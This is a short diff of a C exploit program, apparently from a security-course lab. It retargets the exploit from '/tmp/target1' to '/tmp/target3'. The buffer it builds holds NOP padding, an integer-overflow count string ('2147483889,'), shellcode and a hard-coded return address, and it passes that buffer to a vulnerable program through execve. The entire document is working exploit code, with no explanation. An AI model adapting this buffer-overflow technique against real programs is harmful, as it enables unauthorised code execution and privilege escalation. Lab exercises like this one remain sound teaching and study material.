@@ -4,23 +4,23 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/tmp/target1"
+#define TARGET "/tmp/target3"
 
 int main(void)
 {
   char *args[3];
   char *env[1];
-  char buf[248];
-  memset(buf, 0x90, 248);
+  char buf[241*20];
+  memset(buf, 0x90, 241*20);
 
-  strncpy(buf+195, shellcode, 45);
-  strncpy(buf+244, "\x08\xfd\xff\xbf", 4);
+  strncpy(buf, "2147483889,", 11);
+  strncpy(buf+(235*20), shellcode, 45);
+  strncpy(buf+(240*20)+15, "\x40\xdc\xff\xbf", 4);
   //strncpy(buf+244, "\x12\x34\x56\x78", 4);
   
   args[0] = TARGET; 
   args[1] = buf;
   args[2] = NULL;
-
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
